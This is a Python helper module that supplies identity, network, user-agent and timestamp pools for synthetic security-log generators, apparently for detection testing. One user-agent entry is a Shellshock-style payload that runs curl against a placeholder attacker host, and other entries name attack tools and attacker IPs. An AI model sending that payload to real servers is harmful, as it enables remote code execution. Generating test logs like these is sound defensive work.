"""Shared helpers and data pools used by every log generator."""
import random
from datetime import datetime, timedelta, timezone

# Reproducible-but-varied output: seed once at import time
random.seed()

# -------- identity pools ---------------------------------------------------
USERNAMES = [
    "jsmith", "alopez", "rkhoury", "mhaddad", "tnasr",
    "admin", "administrator", "sa", "root", "guest", "svc_backup",
    "svc_sql", "helpdesk", "kerberos", "ahmad.f", "carol",
]
PRIV_USERS = ["administrator", "admin", "root", "sa", "domain_admin"]
HOSTS = [
    "DC01.corp.local", "DC02.corp.local", "WEB01.corp.local",
    "SQL01.corp.local", "FILE01.corp.local", "WS-ENG-12.corp.local",
    "WS-FIN-04.corp.local", "WS-HR-09.corp.local",
]
DOMAINS = ["CORP", "WORKGROUP", "LAB"]

# -------- network pools ----------------------------------------------------
INTERNAL_IPS = [
    "10.0.1.15", "10.0.1.22", "10.0.2.50", "10.0.3.101",
    "192.168.1.10", "192.168.1.45", "172.16.10.20",
]
EXTERNAL_IPS = [
    "185.220.101.45",   # known TOR exit (example)
    "45.155.205.233",   # scanner range
    "192.241.220.18",
    "5.188.206.14",
    "118.25.6.39",
    "23.94.157.88",
    "203.0.113.7",      # TEST-NET-3
    "198.51.100.42",    # TEST-NET-2
]
ATTACKER_IPS = ["185.220.101.45", "45.155.205.233", "118.25.6.39"]

# -------- time helpers -----------------------------------------------------
def now_utc() -> datetime:
    return datetime.now(timezone.utc)


def rand_recent(max_minutes: int = 60) -> datetime:
    """Random timestamp within the last `max_minutes`."""
    return now_utc() - timedelta(seconds=random.randint(0, max_minutes * 60))


def iso_z(ts: datetime) -> str:
    """2026-05-11T10:30:45.123Z style."""
    return ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{ts.microsecond // 1000:03d}Z"


def syslog_ts(ts: datetime) -> str:
    """May 11 10:30:45 (classic RFC3164)."""
    return ts.strftime("%b %d %H:%M:%S")


def apache_ts(ts: datetime) -> str:
    """[11/May/2026:10:30:45 +0000]"""
    return ts.strftime("[%d/%b/%Y:%H:%M:%S +0000]")


def palo_ts(ts: datetime) -> str:
    """2026/05/11 10:30:45 (Palo Alto format)."""
    return ts.strftime("%Y/%m/%d %H:%M:%S")


# -------- misc -------------------------------------------------------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "curl/7.81.0",
    "python-requests/2.31.0",
    "sqlmap/1.7.2#stable (https://sqlmap.org)",     # known attack tool
    "Nikto/2.1.6",                                  # known attack tool
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "() { :; }; /bin/bash -c \"curl http://evil.example/x\"",   # shellshock-style UA
]


def pick(seq):
    return random.choice(seq)


def maybe(prob: float) -> bool:
    return random.random() < prob
